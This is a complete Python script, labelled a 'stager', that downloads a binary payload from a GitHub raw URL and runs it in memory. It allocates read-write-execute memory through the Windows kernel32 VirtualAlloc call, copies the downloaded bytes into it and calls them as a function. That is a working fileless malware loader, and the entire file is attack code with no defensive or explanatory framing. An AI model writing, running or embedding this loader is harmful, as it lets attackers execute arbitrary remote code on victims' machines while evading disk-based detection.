#!/usr/bin/env python3
"""
Python Stager - Downloads and executes payload in memory
"""

import urllib.request
import ctypes
from ctypes import wintypes
import sys

def main():
    # Payload URL
    payload_url = "https://raw.githubusercontent.com/hadrian420/file/main/pulsar.bin"
    
    print(f"[*] Downloading payload from {payload_url}...")
    
    try:
        # Download payload
        response = urllib.request.urlopen(payload_url)
        payload_data = response.read()
        print(f"[+] Downloaded {len(payload_data)} bytes")
        
        # Load kernel32
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        
        # Memory allocation constants
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        
        # Allocate RWX memory
        print("[*] Allocating memory...")
        ptr = kernel32.VirtualAlloc(
            None,
            len(payload_data),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        
        if not ptr:
            print("[!] VirtualAlloc failed")
            return 1
        
        print(f"[+] Allocated memory at 0x{ptr:X}")
        
        # Copy payload to allocated memory
        print("[*] Copying payload to memory...")
        ctypes.memmove(ptr, payload_data, len(payload_data))
        
        # Execute payload
        print("[*] Executing payload...")
        thread = ctypes.CFUNCTYPE(None)(ptr)
        thread()
        
        print("[+] Execution complete")
        return 0
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
